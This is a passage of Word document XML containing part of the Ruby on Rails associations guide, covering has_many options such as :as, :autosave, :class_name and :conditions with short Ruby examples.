        <w:t xml:space="preserve"> be saved.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6911"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="43C31F6C" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="41939B67" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@order</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @customer.orders.create(:order_date</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; Time.now,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56BDA07F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :order_number</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "A12345")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2F9952AB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2 Options for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28053B32" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">While Rails uses intelligent defaults that will work well in most situations, there may be times when you want to customize the behavior of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association reference. Such customizations can easily be accomplished by passing options when you create the association. For example, this assocation uses two such options:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8231"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="6D36565C" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6BBCB52B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="417F21D1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders, :dependent</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :delete_all, :validate</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="454117AE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="589BF3B1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association supports these options:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71E0B945" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:as</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55308274" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:autosave</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="410975AE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:class_name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22F47060" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:conditions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1687D663" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:counter_sql</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="743860B0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31E24024" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:extend</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FC376D3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:finder_sql</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18B25D03" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:foreign_key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DA70633" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:group</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BA5784A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:include</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76049DB3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:inverse_of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A22CEAB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:limit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="145F4CAB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:offset</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="270CE7BB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:order</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3522BFD6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:primary_key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1126327C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:readonly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="016B8C4D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:select</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15F223DE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:source</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0556B07A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:source_type</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69BCF978" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:through</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11BB5B2F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:uniq</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BA5C921" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:validate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0221D387" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:as</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66BCA208" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Setting the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:as</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option indicates that this is a polymorphic association, as discussed </w:t>
      </w:r>
      <w:hyperlink r:id="rId216" w:anchor="polymorphic-associations" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>earlier in this guide</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DA0EB64" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:autosave</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51734E0B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:autosave</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t>, Rails will save any loaded members and destroy members that are marked for destruction whenever you save the parent object.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F85D96E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:class_name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CF33E34" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the name of the other model cannot be derived from the association name, you can use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:class_name</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to supply the model name. For example, if a customer has many orders, but the actual name of the model containing orders is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Transaction</w:t>
      </w:r>
      <w:r>
        <w:t>, you’d set things up this way:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6144"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="05EC9FA3" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7AA64AA5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="588AA283" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders, :class_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "Transaction"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59895E1F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="61B4D18E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:conditions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70D82E44" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:conditions</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option lets you specify the conditions that the associated object must meet (in the syntax used by an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>WHERE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> clause).</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6744"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="3020BF5B" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3073E64F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6957250F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :confirmed_orders, :class_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "Order",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F35B1C6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :conditions</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "confirmed = 1"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59F1E666" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7359D9E7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You can also set conditions via a hash:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
